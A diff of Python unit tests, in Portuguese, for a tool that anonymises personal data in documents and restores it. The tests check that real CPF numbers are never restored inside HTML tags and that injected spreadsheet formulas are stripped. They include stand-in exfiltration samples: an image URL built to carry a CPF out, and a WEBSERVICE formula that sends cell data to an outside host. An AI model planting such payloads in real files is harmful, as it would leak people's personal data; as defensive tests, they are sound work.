@@ -331,7 +331,8 @@ class Arquivos(unittest.TestCase):
         with self.assertRaises(motor.ErroMotor) as cm:
             verificacao.verificar([caminho], {("TELEFONE", "11987654321"): "(11) 98765-4321"}, "x.md")
         self.assertEqual(cm.exception.codigo, "sobrou_dado")
-        verificacao.verificar([caminho], {("TELEFONE", "11999990000"): "11999990000"}, "x.md")
+        limpo = self.arquivo("y.md", "o telefone ficou [TELEFONE_1] aqui")
+        verificacao.verificar([limpo], {("TELEFONE", "11999990000"): "11999990000"}, "y.md")
 
     def test_reverter_estrutura_html_e_referencias_do_markdown(self):
         tabela = [{"tipo": "CPF", "valor": "52998224725", "marcador": "[CPF_1]"}, {"tipo": "PESSOA", "valor": "Ana Lima", "marcador": "[PESSOA_1]"}]
@@ -475,6 +476,112 @@ class Arquivos(unittest.TestCase):
         r = self.pedir(origem)
         self.assertTrue(r["ok"], r)
         self.assertIn("1990-07-22", self.ler("doc-1.anon.csv"))
+
+    def test_reverter_tag_com_maior_que_dentro_de_aspas(self):
+        tabela = [{"tipo": "CPF", "valor": "52998224725", "marcador": "[CPF_1]"}]
+        casos = ['<img alt=">" src="https://example.invalid/coleta?cpf= [CPF_1]">',
+                 "<img alt='>' src='x\n [CPF_1]'>",
+                 '<a title="a > b" href="/p ?c=\n[CPF_1]">']
+        for tag in casos:
+            r = motor.tratar({"op": "reverter_texto", "texto": "ok [CPF_1] " + tag + " fim [CPF_1]", "tabela": tabela})
+            self.assertEqual(r["texto"], "ok 52998224725 " + tag + " fim 52998224725", tag)
+        # tag que nunca fecha: nada depois dela é restaurado
+        r = motor.tratar({"op": "reverter_texto", "texto": 'antes [CPF_1] <img src="x [CPF_1]', "tabela": tabela})
+        self.assertEqual(r["texto"], 'antes 52998224725 <img src="x [CPF_1]')
+
+    def test_reverter_fuzz_nenhum_valor_real_dentro_de_tag(self):
+        import random
+        rnd = random.Random(20261107)
+        tabela = [{"tipo": "CPF", "valor": "52998224725", "marcador": "[CPF_1]"}]
+        valores = ["https://example.invalid/c?d=", "", "x ", "\n", "a > b ", "/p?c=", " "]
+        for _ in range(300):
+            partes_texto, esperado = [], []
+            for _ in range(rnd.randint(1, 4)):
+                q = rnd.choice(['"', "'"])
+                other = "'" if q == '"' else '"'
+                atrib = "%s=%s%s%s%s%s" % (rnd.choice(["src", "alt", "href", "data-x"]), q, rnd.choice(valores), rnd.choice(["", ">", " > ", other + ">" + other]),
+                                          rnd.choice(["", " ", "\n", "  \n "]) + "[CPF_1]" + rnd.choice(["", " x"]), q)
+                tag = "<%s %s%s>" % (rnd.choice(["img", "a", "div", "source", "iframe"]), rnd.choice(["", 'alt=">" ', "id=1 "]), atrib)
+                partes_texto += [" texto [CPF_1] ", tag, "\n"]
+                esperado += [" texto 52998224725 ", tag, "\n"]
+            r = motor.tratar({"op": "reverter_texto", "texto": "".join(partes_texto), "tabela": tabela})
+            self.assertEqual(r["texto"], "".join(esperado), "".join(partes_texto))
+
+    def test_verificacao_independente_acha_dado_fora_da_lista(self):
+        caminho = self.arquivo("i.md", "contato %s e fulano@exemplo.com e 4111 1111 1111 1111; marcador [CPF_1] ignorado" % fmt_cpf(cpf_ficticio("246813579")))
+        with self.assertRaises(motor.ErroMotor) as cm:
+            verificacao.verificar([caminho], {}, "i.md")
+        self.assertEqual(cm.exception.codigo, "sobrou_dado")
+        limpo = self.arquivo("l.md", "só [CPF_1], [EMAIL_1] e ［CPF_2］ aqui, ano 2026 e 12345")
+        verificacao.verificar([limpo], {}, "l.md")
+
+    @unittest.skipUnless(tem("openpyxl"), "openpyxl não está instalado neste Python")
+    def test_xlsx_formula_matricial_na_coluna_cpf(self):
+        import openpyxl
+        from openpyxl.worksheet.formula import ArrayFormula
+        cpf = cpf_ficticio("012345678")
+        wb = openpyxl.Workbook()
+        ws = wb.active
+        ws.append(["Nome", "CPF"])
+        ws["B2"] = ArrayFormula("B2", "=%d" % int(cpf))
+        ws["A2"] = "x"
+        ws["B3"] = ArrayFormula("B3", "=SUM(A1:A2*A1:A2)")
+        origem = os.path.join(self.tmp, "m.xlsx")
+        wb.save(origem)
+        r = self.pedir(origem)
+        self.assertTrue(r["ok"], r)
+        novo = openpyxl.load_workbook(os.path.join(self.saida, "doc-1.anon.xlsx")).active
+        self.assertEqual(novo["B2"].value, "[CPF_1]")
+        self.assertEqual(novo["B2"].data_type, "s")
+        self.assertEqual(getattr(novo["B3"].value, "text", novo["B3"].value), "=SUM(A1:A2*A1:A2)")   # sem dado: fica como era
+        csv_ = self.ler("doc-1.anon.csv")
+        self.assertNotIn(str(int(cpf)), csv_)
+        self.assertNotIn("ArrayFormula", csv_)
+        self.assertIn("[CPF_1]", csv_)
+
+    @unittest.skipUnless(tem("openpyxl"), "openpyxl não está instalado neste Python")
+    def test_xlsx_reverter_tira_toda_formula_do_pacote(self):
+        import openpyxl
+        from openpyxl.formatting.rule import FormulaRule
+        from openpyxl.workbook.defined_name import DefinedName
+        from openpyxl.worksheet.datavalidation import DataValidation
+        from openpyxl.worksheet.table import Table
+        wb = openpyxl.Workbook()
+        ws = wb.active
+        ws.append(["a", "b"])
+        ws.append([1, "[CPF_1]"])
+        ws.append([2, "x"])
+        ws.add_table(Table(displayName="T1", ref="A1:B3"))
+        dv = DataValidation(type="list", formula1='"a,b"')
+        ws.add_data_validation(dv)
+        dv.add("A2")
+        ws.conditional_formatting.add("A1:A3", FormulaRule(formula=['A1>1']))
+        wb.defined_names["nome"] = DefinedName("nome", attr_text="Sheet!$A$1")
+        origem = os.path.join(self.tmp, "t.xlsx")
+        wb.save(origem)
+        injetado = os.path.join(self.tmp, "t2.xlsx")
+        with zipfile.ZipFile(origem) as zin, zipfile.ZipFile(injetado, "w") as zout:
+            for info in zin.infolist():
+                dados = zin.read(info.filename)
+                if info.filename == "xl/tables/table1.xml":
+                    dados = dados.replace(b'<tableColumn id="2" name="b"', b'<tableColumn id="2" name="b"><calculatedColumnFormula>WEBSERVICE("https://x/?d="&amp;A2)</calculatedColumnFormula></tableColumn><tableColumn id="9" name="c"', 1) if b'name="b"' in dados else dados
+                zout.writestr(info, dados)
+        saida = os.path.join(self.tmp, "t-saida.xlsx")
+        r = motor.tratar({"op": "reverter", "entrada": injetado, "saida": saida, "tabela": [{"tipo": "CPF", "valor": "52998224725", "marcador": "[CPF_1]"}]})
+        self.assertTrue(r["ok"], r)
+        import ooxml
+        with zipfile.ZipFile(saida) as z:
+            for n in z.namelist():
+                if n.endswith((".xml", ".rels")):
+                    self.assertIsNone(ooxml._RX_FORMULA_BRUTA.search(z.read(n).decode("utf-8")), n)
+        openpyxl.load_workbook(saida)   # continua abrindo
+        # a conferência final recusa um pacote com fórmula
+        ruim = os.path.join(self.tmp, "ruim.xlsx")
+        with zipfile.ZipFile(ruim, "w") as z:
+            z.writestr("xl/worksheets/sheet1.xml", '<worksheet><sheetData><row><c><f>1+1</f></c></row></sheetData></worksheet>')
+        with self.assertRaises(motor.ErroMotor) as cm:
+            ooxml.conferir_sem_formulas(ruim, "ruim.xlsx")
+        self.assertEqual(cm.exception.codigo, "formula_residual")
 
     def test_pptx_reverter(self):
         slide = ('<?xml version="1.0"?><p:sld xmlns:a="a" xmlns:p="p"><a:p><a:r><a:t>Cliente [PESS</a:t></a:r>'
